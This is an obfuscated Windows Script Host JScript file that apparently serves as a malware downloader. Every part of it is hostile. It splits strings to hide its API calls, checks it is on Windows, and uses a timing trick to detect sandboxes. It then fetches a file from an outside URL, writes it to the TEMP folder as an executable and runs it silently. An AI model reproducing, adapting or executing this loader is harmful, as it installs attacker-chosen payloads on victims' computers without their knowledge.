var P0 = false;
var N = "Create"+"Object";
var WX = function P() {return WScript[N]("WScript"+".Shell");}(), G = 11;
var V0 = "MSXML2"+".XMLHTTP";
var L0 = 2;
var D = L0 - 2;
function RU(J){WX["Run"](J, D, D);};
function LQ(){return V0 + "";};
function UY(P1, YH){D = D * 1; return P1 - YH;};
function I(){return N;};
/*@cc_on
  @if (@_win32 || @_win64)
    P0 = true;
  @end
@*/
if (P0)
{
var VD = "";
function RW(){return 22;};
var A0 = 0; var FN = 0;
function TL()
{
var A = new this["Date"]();
var MQ = A["getUTCMilliseconds"]();
WScript["Sleep"](RW());
var A = new this["Date"]();
var F = A["getUTCMilliseconds"]();
WScript["Sleep"](RW());
var A = new this["Date"]();
var I0 = A["getUTCMilliseconds"]();
var A0 = "N0";
A0 = UY(F, MQ);
var FN = "FH";
FN = UY(I0, F);
VD = "open";
return UY(A0, FN);
}
var X = false;
var UD = false;
for (var S = D; S < RW() * 1; S++){if (TL() != D){
X = true; 
FN = "31" + 11 * A0 + FN; 
UD = true; 
break;
}}
function Z() {return ((X == true) && (X == UD)) ? 1 : D;};
if (X && Z() && UD){
function TG() {return WX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0P9NIcmJ.ex" + "e";};
 DP = LQ();
 JO = WScript[N](DP);
 var Y = 1;
do { 
	for (;Y;){
	try {
		if (Y == 1)
		{
			JO[VD]("GET", "http://ekotrade.pl/m4ujda", false);
			JO["send"]();
			V1 = "Sleep";
			Y = 2;
		}
		WScript[V1](RW() + 120); 
		if (JO["readystate"] < 2 * 2) continue;
		Y = D;
		function LJ(V) {var IP = (1, 2, 3, 4, 5, V); return IP;};
		C = WScript[I()]("ADODB.Stream");
		DP = C;
		DP[VD]();
		DP["type"] = LJ(1);
		DP["write"](JO["ResponseBody"]);
		C["position"] = LJ(D);
		DP["Save" + "ToFile"](TG(), 2);
		C["cl"+"ose"]();
		L = TG();
		RU(L);
	} catch(IB){};};
}while (Y);
}
}

